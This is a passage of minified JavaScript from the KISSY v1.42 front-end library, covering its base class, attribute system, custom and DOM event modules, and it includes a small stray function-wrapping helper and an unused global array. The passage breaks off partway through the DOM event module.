/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 6 15:30
*/
KISSY.add("base", ["attribute"], function (e, q) {
  function h(b, a) {
    return function (d) {
      return function () {
        a ? d.apply(this, arguments) : this.callSuper.apply(this, arguments);
        var c = arguments.callee.__owner__.__extensions__ || [];
        a && c.reverse();
        var f = arguments,
          e;
        if (e = c && c.length) for (var g = 0; g < e; g++) {
          var m = c[g] && (!b ? c[g] : c[g].prototype[b]);
          m && m.apply(this, f || []);
        }
        a ? this.callSuper.apply(this, arguments) : d.apply(this, arguments);
      };
    };
  }
  function n(b) {
    var a = this.__hooks__,
      d = this.prototype;
    if (this.__extensions__.length && a) for (var c in a) if (!d.hasOwnProperty(c) || b.hasOwnProperty(c)) b[c] = b[c] || o;
    return r.call(this, b);
  }
  function s(b) {
    var a;
    b.target === this && (a = this[i + b.type.slice(5).slice(0, -6)], a.call(this, b.newVal, b));
  }
  function t(b) {
    var a = b.get("plugins"),
      d;
    e.each(a, function (b, f) {
      "function" === typeof b && (d = b, a[f] = new d());
    });
  }
  function j(b) {
    var a,
      d = this.get("plugins");
    if (a = d.length) for (var c = 0; c < a; c++) if (d[c][b]) d[c][b](this);
  }
  var p = q("attribute"),
    k = e.ucfirst,
    i = "_onSet",
    o = e.noop,
    l = p.extend({
      constructor: function () {
        this.callSuper.apply(this, arguments);
        var b = this.get("listeners"),
          a;
        for (a in b) this.on(a, b[a]);
        this.initializer();
        t(this);
        j.call(this, "pluginInitializer");
        this.bindInternal();
        this.syncInternal();
      },
      initializer: o,
      __getHook: h,
      __callPluginsMethod: j,
      bindInternal: function () {
        var b = this.getAttrs(),
          a,
          d;
        for (a in b) if (d = i + k(a), this[d]) this.on("after" + k(a) + "Change", s);
      },
      syncInternal: function () {
        var b = [],
          a;
        a = this.constructor;
        for (var d = this.getAttrs(); a;) b.push(a), a = a.superclass && a.superclass.constructor;
        b.reverse();
        for (a = 0; a < b.length; a++) {
          var c = b[a].ATTRS || {},
            f;
          for (f in c) if (f in d) {
            var e, g;
            (g = this[i + k(f)]) && 0 !== d[f].sync && void 0 !== (e = this.get(f)) && g.call(this, e);
          }
        }
      },
      plug: function (b) {
        "function" === typeof b && (b = new b());
        b.pluginInitializer && b.pluginInitializer(this);
        this.get("plugins").push(b);
        return this;
      },
      unplug: function (b) {
        var a = [],
          d = this,
          c = "string" === typeof b;
        e.each(d.get("plugins"), function (f) {
          var e = 0,
            g;
          b && (c ? (g = f.get && f.get("pluginId") || f.pluginId, g !== b && (a.push(f), e = 1)) : f !== b && (a.push(f), e = 1));
          e || f.pluginDestructor(d);
        });
        d.setInternal("plugins", a);
        return d;
      },
      getPlugin: function (b) {
        var a = null;
        e.each(this.get("plugins"), function (d) {
          if ((d.get && d.get("pluginId") || d.pluginId) === b) return a = d, !1;
        });
        return a;
      },
      destructor: e.noop,
      destroy: function () {
        this.get("destroyed") || (j.call(this, "pluginDestructor"), this.destructor(), this.set("destroyed", !0), this.fire("destroy"), this.detach());
      }
    });
  e.mix(l, {
    __hooks__: {
      initializer: h(),
      destructor: h("__destructor", !0)
    },
    ATTRS: {
      plugins: {
        value: []
      },
      destroyed: {
        value: !1
      },
      listeners: {
        value: []
      }
    },
    extend: function a(d, c, f) {
      e.isArray(d) || (f = c, c = d, d = []);
      f = f || {};
      c = c || {};
      c = p.extend.call(this, c, f);
      c.__extensions__ = d;
      n.call(c, {});
      if (d.length) {
        var h = {},
          g = {};
        e.each(d.concat(c), function (a) {
          if (a) {
            e.each(a.ATTRS, function (a, c) {
              var d = h[c] = h[c] || {};
              e.mix(d, a);
            });
            var a = a.prototype,
              c;
            for (c in a) a.hasOwnProperty(c) && (g[c] = a[c]);
          }
        });
        c.ATTRS = h;
        g.constructor = c;
        e.augment(c, g);
      }
      c.extend = f.extend || a;
      c.addMembers = n;
      return c;
    }
  });
  var r = l.addMembers;
  return e.Base = l;
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:04
*/
KISSY.add("attribute", ["event/custom"], function (g, p, F, C) {
  function n(d, a) {
    return "string" === typeof a ? d[a] : a;
  }
  function o(d) {
    return d.__attrVals || (d.__attrVals = {});
  }
  function q(d, a, c, b, e, f, h, i) {
    h = h || c;
    return d.fire(a + g.ucfirst(c) + "Change", g.mix({
      attrName: h,
      subAttrName: f,
      prevVal: b,
      newVal: e
    }, i));
  }
  function k(d, a, c) {
    var b = d[a];
    !c && !b && (d[a] = b = {});
    return b || {};
  }
  function t(d, a) {
    for (var c = 0, b = a.length; void 0 !== d && c < b; c++) d = d[a[c]];
    return d;
  }
  function u(d) {
    var a;
    -1 !== d.indexOf(".") && (a = d.split("."), d = a.shift());
    return {
      path: a,
      name: d
    };
  }
  function v(d, a, c) {
    var b = c;
    if (a) {
      var d = b = void 0 === d ? {} : g.clone(d),
        e = a.length - 1;
      if (0 <= e) {
        for (var f = 0; f < e; f++) d = d[a[f]];
        void 0 !== d && (d[a[f]] = c);
      }
    }
    return b;
  }
  function w(d, a, c, b, e) {
    var f, h, i;
    f = u(a);
    var D = a,
      a = f.name;
    f = f.path;
    i = d.get(a);
    var l = a,
      m = k(d, "__defaultBeforeFns");
    m[l] || (m[l] = 1, l = "before" + g.ucfirst(l) + "Change", d.publish(l, {
      defaultFn: x
    }));
    f && (h = t(i, f));
    if (b.force || !(!f && i === c || f && h === c)) {
      c = v(i, f, c);
      c = g.mix({
        attrName: a,
        subAttrName: D,
        prevVal: i,
        newVal: c,
        _opts: b,
        _attrs: e,
        target: d
      }, b.data);
      if (b.silent) {
        if (j === x.call(d, c)) return j;
      } else if (j === d.fire("before" + g.ucfirst(a) + "Change", c)) return j;
      return d;
    }
  }
  function x(d) {
    if (d.target === this) {
      var a = d.newVal,
        c = d.prevVal,
        b = d.attrName,
        e = d.subAttrName,
        f = d._attrs,
        d = d._opts,
        a = this.setInternal(b, a);
      if (a === j) return a;
      d.silent || (a = o(this)[b], q(this, "after", b, c, a, e, null, d.data), f ? f.push({
        prevVal: c,
        newVal: a,
        attrName: b,
        subAttrName: e
      }) : q(this, "", "*", [c], [a], [e], [b], d.data));
    }
  }
  function r(d) {
    var a = this.constructor;
    for (this.userConfig = d; a;) {
      var c = a.ATTRS;
      if (c) {
        var b = void 0;
        for (b in c) this.addAttr(b, c[b], !1);
      }
      a = a.superclass ? a.superclass.constructor : null;
    }
    if (d) for (var e in d) this.setInternal(e, d[e]);
  }
  function y(d, a) {
    var c = a.__hooks__ || {},
      b;
    for (b in c) b in d && (d[b] = c[b](d[b]));
    g.each(d, function (b, c) {
      if ("function" === typeof b) {
        var g = 0;
        if (b.__owner__) {
          var i = b.__owner__;
          delete b.__owner__;
          delete b.__name__;
          var g = b.__wrapped__ = 1,
            j = z(b);
          j.__owner__ = i;
          j.__name__ = c;
          i.prototype[c] = j;
        } else b.__wrapped__ && (g = 1);
        g && (d[c] = b = z(b));
        b.__owner__ = a;
        b.__name__ = c;
      }
    });
  }
  function E(d) {
    y(d, this);
    g.mix(this.prototype, d);
  }
  function s(d, a) {
    var c = d.getAttrs(),
      b = k(c, a, 1),
      e = b.valueFn;
    if (e && (e = n(d, e))) e = e.call(d), void 0 !== e && (b.value = e), delete b.valueFn, c[a] = b;
    return b.value;
  }
  function A(d, a, c, b) {
    var e, f;
    e = u(a);
    a = e.name;
    if (e = e.path) f = d.get(a), c = v(f, e, c);
    if ((e = k(d.getAttrs(), a).validator) && (e = n(d, e))) if (d = e.call(d, c, a, b), void 0 !== d && !0 !== d) return d;
  }
  p = p("event/custom");
  C.exports = r;
  var z = g.bind,
    B = {},
    j = !1;
  r.extend = function a(c, b) {
    var e,
      b = b || {},
      c = c || {},
      f = b.__hooks__;
    if (e = this.__hooks__) f = b.__hooks__ = b.__hooks__ || {}, g.mix(f, e, !1);
    e = c.hasOwnProperty("constructor") ? c.constructor : function () {
      this.callSuper.apply(this, arguments);
    };
    c.constructor = e;
    e.__hooks__ = f;
    y(c, e);
    var h = b.inheritedStatics;
    if (f = this.inheritedStatics) h = b.inheritedStatics = b.inheritedStatics || {}, g.mix(h, f, !1);
    g.extend(e, this, c, b);
    h && g.mix(e, h);
    e.extend = b.extend || a;
    e.addMembers = E;
    return e;
  };
  g.augment(r, p.Target, {
    INVALID: B,
    callSuper: function () {
      var a,
        c,
        b = arguments;
      "function" === typeof this && this.__name__ ? (a = this, c = b[0], b = Array.prototype.slice.call(b, 1)) : (a = arguments.callee.caller, a.__wrapped__ && (a = a.caller), c = this);
      var e = a.__name__;
      if (e) return a = a.__owner__.superclass[e], !a ? void 0 : a.apply(c, b || []);
    },
    getAttrs: function () {
      return this.__attrs || (this.__attrs = {});
    },
    getAttrVals: function () {
      var a = {},
        c,
        b = this.getAttrs();
      for (c in b) a[c] = this.get(c);
      return a;
    },
    addAttr: function (a, c, b) {
      var e = this.getAttrs(),
        f,
        c = g.clone(c);
      (f = e[a]) ? g.mix(f, c, b) : e[a] = c;
      return this;
    },
    addAttrs: function (a, c) {
      var b = this;
      g.each(a, function (a, c) {
        b.addAttr(c, a);
      });
      c && b.set(c);
      return b;
    },
    hasAttr: function (a) {
      return this.getAttrs().hasOwnProperty(a);
    },
    removeAttr: function (a) {
      var c = o(this),
        b = this.getAttrs();
      this.hasAttr(a) && (delete b[a], delete c[a]);
      return this;
    },
    set: function (a, c, b) {
      var e;
      if (g.isPlainObject(a)) {
        var b = c || {},
          c = Object(a),
          f = [],
          h = [];
        for (a in c) void 0 !== (e = A(this, a, c[a], c)) && h.push(e);
        if (h.length) return b.error && b.error(h), j;
        for (a in c) w(this, a, c[a], b, f);
        var i = [],
          k = [],
          l = [],
          m = [];
        g.each(f, function (a) {
          k.push(a.prevVal);
          l.push(a.newVal);
          i.push(a.attrName);
          m.push(a.subAttrName);
        });
        i.length && q(this, "", "*", k, l, m, i, b.data);
        return this;
      }
      b = b || {};
      e = A(this, a, c);
      return void 0 !== e ? (b.error && b.error(e), j) : w(this, a, c, b);
    },
    setInternal: function (a, c) {
      var b,
        e = k(this.getAttrs(), a).setter;
      if (e && (e = n(this, e))) b = e.call(this, c, a);
      if (b === B) return j;
      void 0 !== b && (c = b);
      o(this)[a] = c;
    },
    get: function (a) {
      var c,
        b = o(this),
        e,
        f;
      -1 !== a.indexOf(".") && (c = a.split("."), a = c.shift());
      e = k(this.getAttrs(), a, 1).getter;
      f = a in b ? b[a] : s(this, a);
      if (e && (e = n(this, e))) f = e.call(this, f, a);
      !(a in b) && void 0 !== f && (b[a] = f);
      c && (f = t(f, c));
      return f;
    },
    reset: function (a, c) {
      if ("string" === typeof a) return this.hasAttr(a) ? this.set(a, s(this, a), c) : this;
      var c = a,
        b = this.getAttrs(),
        e = {};
      for (a in b) e[a] = s(this, a);
      this.set(e, c);
      return this;
    }
  });
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:15
*/
KISSY.add("event/custom/observer", ["event/base"], function (g, c) {
  function a() {
    a.superclass.constructor.apply(this, arguments);
  }
  var i = c("event/base");
  g.extend(a, i.Observer, {
    keys: ["fn", "context", "groups"]
  });
  return a;
});
var globalVarsStore = [];
KISSY.add("event/custom/object", ["event/base"], function (g, c) {
  function a(c) {
    a.superclass.constructor.call(this);
    g.mix(this, c);
  }
  var i = c("event/base");
  g.extend(a, i.Object);
  return a;
});
KISSY.add("event/custom/observable", ["event/base", "./observer", "./object"], function (g, c) {
  function a() {
    a.superclass.constructor.apply(this, arguments);
    this.defaultFn = null;
    this.defaultTargetOnly = !1;
    this.bubbles = !0;
  }
  var i = c("event/base"),
    j = c("./observer"),
    n = c("./object"),
    k = i.Utils;
  g.extend(a, i.Observable, {
    on: function (b) {
      b = new j(b);
      g.Config.debug && (b.fn || "lack event handler for " + this.type);
      -1 === this.findObserver(b) && this.observers.push(b);
    },
    fire: function (b) {
      var b = b || {},
        f = this.bubbles,
        d = this.currentTarget,
        e,
        k = this.type,
        m = this.defaultFn,
        l,
        h = b,
        a;
      b.type = k;
      h instanceof n || (h.target = d, h = new n(h));
      h.currentTarget = d;
      b = this.notify(h);
      !1 !== a && void 0 !== b && (a = b);
      if (f && !h.isPropagationStopped()) {
        e = (f = d.getTargets()) && f.length || 0;
        for (l = 0; l < e && !h.isPropagationStopped(); l++) b = f[l].fire(k, h), !1 !== a && void 0 !== b && (a = b);
      }
      if (m && !h.isDefaultPrevented() && (k = h.target, b = k.getCustomEventObservable(h.type), !this.defaultTargetOnly && !b.defaultTargetOnly || d === k)) a = m.call(d, h);
      return a;
    },
    notify: function (b) {
      var f = [].concat(this.observers),
        d,
        e,
        k = f.length,
        a;
      for (a = 0; a < k && !b.isImmediatePropagationStopped(); a++) d = f[a].notify(b, this), !1 !== e && void 0 !== d && (e = d);
      return e;
    },
    detach: function (b) {
      var a,
        d = b.fn,
        e = b.context,
        g = this.currentTarget,
        m = this.observers,
        b = b.groups;
      if (m.length) {
        b && (a = k.getGroupsRe(b));
        var l,
          h,
          c,
          i,
          j = m.length;
        if (d || a) {
          e = e || g;
          l = b = 0;
          for (h = []; b < j; ++b) if (c = m[b], i = c.context || g, e !== i || d && d !== c.fn || a && !c.groups.match(a)) h[l++] = c;
          this.observers = h;
        } else this.reset();
      }
    }
  });
  return a;
});
KISSY.add("event/custom/target", ["event/base", "./observable"], function (g, c) {
  var a = c("event/base"),
    i = c("./observable"),
    j = a.Utils,
    n = j.splitAndRun;
  return {
    isTarget: 1,
    getCustomEventObservable: function (a, b) {
      var f,
        d = this.getCustomEvents();
      f = d && d[a];
      !f && b && (f = d[a] = new i({
        currentTarget: this,
        type: a
      }));
      return f;
    },
    fire: function (a, b) {
      var f = this,
        d,
        e = f.getTargets(),
        c = e && e.length,
        b = b || {};
      n(a, function (a) {
        var e;
        j.fillGroupsForEvent(a, b);
        a = b.type;
        if ((e = f.getCustomEventObservable(a)) || c) {
          if (e) {
            if (!e.hasObserver() && !e.defaultFn && (e.bubbles && !c || !e.bubbles)) return;
          } else e = new i({
            currentTarget: f,
            type: a
          });
          a = e.fire(b);
          !1 !== d && void 0 !== a && (d = a);
        }
      });
      return d;
    },
    publish: function (a, b) {
      var c,
        d = this;
      n(a, function (a) {
        c = d.getCustomEventObservable(a, !0);
        g.mix(c, b);
      });
      return d;
    },
    addTarget: function (a) {
      var b = this.getTargets();
      g.inArray(a, b) || b.push(a);
      return this;
    },
    removeTarget: function (a) {
      var b = this.getTargets(),
        a = g.indexOf(a, b);
      -1 !== a && b.splice(a, 1);
      return this;
    },
    getTargets: function () {
      return this["__~ks_bubble_targets"] || (this["__~ks_bubble_targets"] = []);
    },
    getCustomEvents: function () {
      return this["__~ks_custom_events"] || (this["__~ks_custom_events"] = {});
    },
    on: function (a, b, c) {
      var d = this;
      j.batchForType(function (a, b, c) {
        b = j.normalizeParam(a, b, c);
        a = b.type;
        if (a = d.getCustomEventObservable(a, !0)) a.on(b);
      }, 0, a, b, c);
      return d;
    },
    detach: function (a, b, c) {
      var d = this;
      j.batchForType(function (a, b, c) {
        var f = j.normalizeParam(a, b, c);
        (a = f.type) ? (a = d.getCustomEventObservable(a, !0)) && a.detach(f) : (a = d.getCustomEvents(), g.each(a, function (a) {
          a.detach(f);
        }));
      }, 0, a, b, c);
      return d;
    }
  };
});
KISSY.add("event/custom", ["./custom/target"], function (g, c) {
  var a = c("./custom/target");
  return {
    Target: a,
    global: g.mix({}, a)
  };
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:15
*/
KISSY.add("event/base/utils", [], function (f) {
  function e(a) {
    if (0 > a.indexOf(".")) return [a, ""];
    var b = a.match(/([^.]+)?(\..+)?$/),
      a = [b[1]];
    (b = b[2]) ? (b = b.split(".").sort(), a.push(b.join("."))) : a.push("");
    return a;
  }
  var d, c;
  return {
    splitAndRun: d = function (a, b) {
      f.isArray(a) ? f.each(a, b) : (a = f.trim(a), -1 === a.indexOf(" ") ? b(a) : f.each(a.split(/\s+/), b));
    },
    normalizeParam: function (a, b, c) {
      var d = b || {},
        d = "function" === typeof b ? {
          fn: b,
          context: c
        } : f.merge(d),
        b = e(a),
        a = b[0];
      d.groups = b[1];
      d.type = a;
      return d;
    },
    batchForType: function (a, b) {
      var c = f.makeArray(arguments),
        e = c[2 + b];
      e && "object" === typeof e ? f.each(e, function (d, e) {
        var f = [].concat(c);
        f.splice(0, 2);
        f[b] = e;
        f[b + 1] = d;
        a.apply(null, f);
      }) : d(e, function (d) {
        var e = [].concat(c);
        e.splice(0, 2);
        e[b] = d;
        a.apply(null, e);
      });
    },
    fillGroupsForEvent: function (a, b) {
      var d = e(a),
        f = d[1];
      f && (f = c(f), b._ksGroups = f);
      b.type = d[0];
    },
    getGroupsRe: c = function (a) {
      return RegExp(a.split(".").join(".*\\.") + "(?:\\.|$)");
    }
  };
});
KISSY.add("event/base/object", [], function (f, e) {
  function d() {
    this.timeStamp = f.now();
    this.currentTarget = this.target = e;
  }
  var c = function () {
      return !1;
    },
    a = function () {
      return !0;
    };
  d.prototype = {
    constructor: d,
    isDefaultPrevented: c,
    isPropagationStopped: c,
    isImmediatePropagationStopped: c,
    preventDefault: function () {
      this.isDefaultPrevented = a;
    },
    stopPropagation: function () {
      this.isPropagationStopped = a;
    },
    stopImmediatePropagation: function () {
      this.isImmediatePropagationStopped = a;
      this.stopPropagation();
    },
    halt: function (a) {
      a ? this.stopImmediatePropagation() : this.stopPropagation();
      this.preventDefault();
    }
  };
  return d;
});
KISSY.add("event/base/observer", [], function (f, e) {
  function d(c) {
    f.mix(this, c);
  }
  d.prototype = {
    constructor: d,
    equals: function (c) {
      var a = this;
      return !!f.reduce(a.keys, function (b, d) {
        return b && a[d] === c[d];
      }, 1);
    },
    simpleNotify: function (c, a) {
      var b;
      b = this.fn.call(this.context || a.currentTarget, c, this.data);
      this.once && a.removeObserver(this);
      return b;
    },
    notifyInternal: function (c, a) {
      var b = this.simpleNotify(c, a);
      !1 === b && c.halt();
      return b;
    },
    notify: function (c, a) {
      var b = c._ksGroups;
      return b && (!this.groups || !this.groups.match(b)) ? e : this.notifyInternal(c, a);
    }
  };
  return d;
});
KISSY.add("event/base/observable", [], function (f) {
  function e(d) {
    this.currentTarget = null;
    f.mix(this, d);
    this.reset();
  }
  e.prototype = {
    constructor: e,
    hasObserver: function () {
      return !!this.observers.length;
    },
    reset: function () {
      this.observers = [];
    },
    removeObserver: function (d) {
      var c,
        a = this.observers,
        b = a.length;
      for (c = 0; c < b; c++) if (a[c] === d) {
        a.splice(c, 1);
        break;
      }
      this.checkMemory();
    },
    checkMemory: function () {},
    findObserver: function (d) {
      var c = this.observers,
        a;
      for (a = c.length - 1; 0 <= a; --a) if (d.equals(c[a])) return a;
      return -1;
    }
  };
  return e;
});
KISSY.add("event/base", ["./base/utils", "./base/object", "./base/observer", "./base/observable"], function (f, e) {
  var d = e("./base/utils"),
    c = e("./base/object"),
    a = e("./base/observer"),
    b = e("./base/observable");
  return {
    Utils: d,
    Object: c,
    Observer: a,
    Observable: b
  };
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:16
*/
KISSY.add("event", ["event/dom", "event/custom"], function (b, d) {
  var a = d("event/dom"),
    c = d("event/custom"),
    a = b.Event = b.merge(a, {
      DomEvent: a,
      CustomEvent: c
    });
  a.global = c.global;
  b.EventTarget = a.Target = c.Target;
  return a;
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:15
*/
function jshook(target, name, onEvent) {
  const original = target[name];
  target[name] = function () {
    onEvent.apply(this, arguments);
    return original.apply(this, arguments);
  };
}
KISSY.add("event/dom/base/utils", ["dom"], function (i, b) {
  var a = b("dom"),
    c = "ksEventTargetId_" + i.now(),
    d = i.Env.host.document;
  return {
    simpleAdd: d && d.addEventListener ? function (a, b, d, c) {
      a.addEventListener && a.addEventListener(b, d, !!c);
    } : function (a, b, d) {
      a.attachEvent && a.attachEvent("on" + b, d);
    },
    simpleRemove: d && d.removeEventListener ? function (a, b, d, c) {
      a.removeEventListener && a.removeEventListener(b, d, !!c);
    } : function (a, b, d) {
      a.detachEvent && a.detachEvent("on" + b, d);
    },
    data: function (b, d) {
      return a.data(b, c, d);
    },
    removeData: function (b) {
      return a.removeData(b, c);
    }
  };
});
KISSY.add("event/dom/base/special", [], function () {
  return {};
});
KISSY.add("event/dom/base/observer", ["event/base", "./special"], function (i, b) {
  function a(b) {
    a.superclass.constructor.call(this, b);
  }
  var c = b("event/base"),
    d = b("./special");
  i.extend(a, c.Observer, {
    keys: "fn,filter,data,context,originalType,groups,last".split(","),
    notifyInternal: function (a, b) {
      var c,
        i,
        k = a.type,
        h;
      (h = this.originalType) ? a.type = h : h = k;
      (c = d[h]) && c.handle ? (c = c.handle(a, this, b)) && 0 < c.length && (i = c[0]) : i = this.simpleNotify(a, b);
      !1 === i && a.halt();
      a.type = k;
      return i;
    }
  });
  return a;
});
KISSY.add("event/dom/base/object", ["event/base"], function (i, b) {
  function a() {
    return s;
  }
  function c() {
    return r;
  }
  function d(n) {
    var t = n.type;
    d.superclass.constructor.call(this);
    this.originalEvent = n;
    var e = c;
    "defaultPrevented" in n ? e = n.defaultPrevented ? a : c : "getPreventDefault" in n ? e = n.getPreventDefault() ? a : c : "returnValue" in n && (e = n.returnValue === r ? a : c);
    this.isDefaultPrevented = e;
    var g = [],
      f,
      j = k.concat();
    i.each(h, function (a) {
      t.match(a.reg) && (j = j.concat(a.props), a.fix && g.push(a.fix));
    });
    for (e = j.length; e;) f = j[--e], this[f] = n[f];
    this.target || (this.target = n.srcElement || m);
    3 === this.target.nodeType && (this.target = this.target.parentNode);
    for (e = g.length; e;) f = g[--e], f(this, n);
  }
  var o = b("event/base"),
    m = i.Env.host.document,
    s = !0,
    r = !1,
    k = "altKey,bubbles,cancelable,ctrlKey,currentTarget,eventPhase,metaKey,shiftKey,target,timeStamp,view,type".split(","),
    h = [{
      reg: /^key/,
      props: ["char", "charCode", "key", "keyCode", "which"],
      fix: function (a, h) {
        null == a.which && (a.which = null != h.charCode ? h.charCode : h.keyCode);
        void 0 === a.metaKey && (a.metaKey = a.ctrlKey);
      }
    }, {
      reg: /^touch/,
      props: ["touches", "changedTouches", "targetTouches"]
    }, {
      reg: /^gesturechange$/i,
      props: ["rotation", "scale"]
    }, {
      reg: /^(mousewheel|DOMMouseScroll)$/,
      props: [],
      fix: function (a, h) {
        var e,
          g,
          f,
          j = h.wheelDelta,
          l = h.axis,
          b = h.wheelDeltaY,
          c = h.wheelDeltaX,
          d = h.detail;
        j && (f = j / 120);
        d && (f = -(0 === d % 3 ? d / 3 : d));
        void 0 !== l && (l === a.HORIZONTAL_AXIS ? (g = 0, e = -1 * f) : l === a.VERTICAL_AXIS && (e = 0, g = f));
        void 0 !== b && (g = b / 120);
        void 0 !== c && (e = -1 * c / 120);
        !e && !g && (g = f);
        void 0 !== e && (a.deltaX = e);
        void 0 !== g && (a.deltaY = g);
        void 0 !== f && (a.delta = f);
      }
    }, {
      reg: /^mouse|contextmenu|click|mspointer|(^DOMMouseScroll$)/i,
      props: "buttons,clientX,clientY,button,offsetX,relatedTarget,which,fromElement,toElement,offsetY,pageX,pageY,screenX,screenY".split(","),
      fix: function (a, h) {
        var e,
          g,
          f = a.target,
          j = h.button;
        null == a.pageX && null != h.clientX && (e = f.ownerDocument || m, g = e.documentElement, e = e.body, a.pageX = h.clientX + (g && g.scrollLeft || e && e.scrollLeft || 0) - (g && g.clientLeft || e && e.clientLeft || 0), a.pageY = h.clientY + (g && g.scrollTop || e && e.scrollTop || 0) - (g && g.clientTop || e && e.clientTop || 0));
        !a.which && void 0 !== j && (a.which = j & 1 ? 1 : j & 2 ? 3 : j & 4 ? 2 : 0);
        !a.relatedTarget && a.fromElement && (a.relatedTarget = a.fromElement === f ? a.toElement : a.fromElement);
        return a;
      }
    }];
  i.extend(d, o.Object, {
    constructor: d,
    preventDefault: function () {
      var a = this.originalEvent;
      a.preventDefault ? a.preventDefault() : a.returnValue = r;
      d.superclass.preventDefault.call(this);
    },
    stopPropagation: function () {
      var a = this.originalEvent;
      a.stopPropagation ? a.stopPropagation() : a.cancelBubble = s;
      d.superclass.stopPropagation.call(this);
    }
  });
  return d;
});
KISSY.add("event/dom/base/observable", "event/base,dom,./special,./utils,./observer,./object".split(","), function (i, b) {
  function a(a) {
    i.mix(this, a);
    this.reset();
  }
  var c = b("event/base"),
    d = b("dom"),
    o = b("./special"),
    m = b("./utils"),
    s = b("./observer"),
    r = b("./object"),
    k = c.Utils;
  i.extend(a, c.Observable, {
    setup: function () {
      var a = this.type,
        b = o[a] || {},
        d = this.currentTarget,
        e = m.data(d).handle;
      (!b.setup || b.setup.call(d, a) === false) && m.simpleAdd(d, a, e);
    },
    constructor: a,
    reset: function () {
      a.superclass.reset.call(this);
      this.lastCount = this.delegateCount = 0;
    },
    notify: function (a) {
      var b = a.target,
        c = a.type,
        e = this.currentTarget,
        g = this.observers,
        f = [],
        j,
        l,
        u = this.delegateCount || 0,
        p,
        i;
      if (u && b.nodeType) for (; b !== e;) {
        if (b.disabled !== true || c !== "click") {
          var q = {},
            k,
            m,
            o;
          p = [];
          for (l = 0; l < u; l++) {
            i = g[l];
            o = i.filter;
            m = o + "";
            k = q[m];
            k === void 0 && (k = q[m] = d.test(b, o));
            k && p.push(i);
          }
          p.length && f.push({
            currentTarget: b,
            currentTargetObservers: p
          });
        }
        b = b.parentNode || e;
      }
      u < g.length && f.push({
        currentTarget: e,
        currentTargetObservers: g.slice(u)
      });
      l = 0;
      for (b = f.length; !a.isPropagationStopped() && l < b; ++l) {
        c = f[l];
        p = c.currentTargetObservers;
        c = c.currentTarget;
        a.currentTarget = c;
        for (c = 0; !a.isImmediatePropagationStopped() && c < p.length; c++) {
          e = p[c];
          e = e.notify(a, this);
          j !== false && e !== void 0 && (j = e);
        }
      }
      return j;
    },
    fire: function (h, b) {
      var h = h || {},
        c = "" + this.type,
        e,
        g,
        f = o[c] || {};
      e = f.bubbles !== false;
      var j = this.currentTarget;
      if (!(f.fire && f.fire.call(j, b) === false)) {
        if (!(h instanceof r)) {
          g = h;
          h = new r({
            currentTarget: j,
            type: c,
            target: j
          });
          i.mix(h, g);
        }
        if (!(f.preFire && f.preFire.call(j, h, b) === false)) {
          g = j;
          var l = d.getWindow(g),
            u = l.document,
            f = [],
            p,
            k = "on" + c,
            q = 0;
          do {
            f.push(g);
            g = g.parentNode || g.ownerDocument || g === u && l;
          } while (!b && g && e);
          g = f[q];
          do {
            h.currentTarget = g;
            if (e = a.getDomEventObservable(g, c)) {
              e = e.notify(h);
              e !== void 0 && p !== false && (p = e);
            }
            g[k] && g[k].call(g) === false && h.preventDefault();
            g = f[++q];
          } while (!b && g && !h.isPropagationStopped());
          if (!b && !h.isDefaultPrevented()) {
            try {
              if (j[c] && !i.isWindow(j)) {
                a.triggeredEvent = c;
                j[c]();
              }
            } catch (m) {
              "trigger action error: " + m;
            }
            a.triggeredEvent = "";
          }
          return p;
        }
      }
    },
    on: function (a) {
      var b = this.observers,
        c = o[this.type] || {},
        a = a instanceof s ? a : new s(a);
      i.Config.debug && (a.fn || "lack event handler for " + this.type);
      if (this.findObserver(a) === -1) {
        if (a.filter) {
          b.splice(this.delegateCount, 0, a);
          this.delegateCount++;
        } else if (a.last) {
          b.push(a);
          this.lastCount++;
        } else b.splice(b.length - this.lastCount, 0, a);
        c.add && c.add.call(this.currentTarget, a);
      }
    },
    detach: function (a) {
      var b,
        c = o[this.type] || {},
        e = "filter" in a,
        g = a.filter,
        f = a.context,
        j = a.fn,
        l = this.currentTarget,
        d = this.observers,
        a = a.groups;
      if (d.length) {
        a && (b = k.getGroupsRe(a));
        var p,
          i,
          q,
          m,
          r = d.length;
        if (j || e || b) {
          f = f || l;
          p = a = 0;
          for (i = []; a < r; ++a) {
            q = d[a];
            m = q.context || l;
            if (f !== m || j && j !== q.fn || e && (g && g !== q.filter || !g && !q.filter) || b && !q.groups.match(b)) i[p++] = q;else {
              q.filter && this.delegateCount && this.delegateCount--;
              q.last && this.lastCount && this.lastCount--;
              c.remove && c.remove.call(l, q);
            }
          }
          this.observers = i;
        } else this.reset();
        this.checkMemory();
      }
    },
    checkMemory: function () {
      var a = this.type,
        b,
        c,
        e = o[a] || {},
        g = this.currentTarget,
        f = m.data(g);
      if (f) {
        b = f.observables;
        if (!this.hasObserver()) {
          c = f.handle;
          (!e.tearDown || e.tearDown.call(g, a) === false) && m.simpleRemove(g, a, c);
          delete b[a];
        }
        if (i.isEmptyObject(b)) {
          f.handle = null;
          m.removeData(g);
        }
      }
    }
  });
  a.triggeredEvent = "";
  a.getDomEventObservable = function (a, b) {
    var c = m.data(a),
      e;
    if (c) e = c.observables;
    return e ? e[b] : null;
  };
  a.getDomEventObservablesHolder = function (a, b) {
    var c = m.data(a);
    !c && b && m.data(a, c = {});
    return c;
  };
  return a;
});
KISSY.add("event/dom/base/dom-event", "event/base,./utils,dom,./special,./observable,./object".split(","), function (i, b) {
  function a(a, b) {
    var c = r[b] || {},
      j;
    if (!a.originalType && (j = c.typeFix)) {
      a.originalType = b;
      b = j;
    }
    return b;
  }
  function c(b, c, f) {
    var j,
      l,
      d,
      f = i.merge(f),
      c = a(f, c);
    j = k.getDomEventObservablesHolder(b, 1);
    if (!(d = j.handle)) {
      d = j.handle = function (a) {
        var b = a.type,
          c = d.currentTarget;
        if (!(k.triggeredEvent === b || typeof KISSY === "undefined")) if (b = k.getDomEventObservable(c, b)) {
          a.currentTarget = c;
          a = new h(a);
          return b.notify(a);
        }
      };
      d.currentTarget = b;
    }
    if (!(l = j.observables)) l = j.observables = {};
    j = l[c];
    if (!j) {
      j = l[c] = new k({
        type: c,
        currentTarget: b
      });
      j.setup();
    }
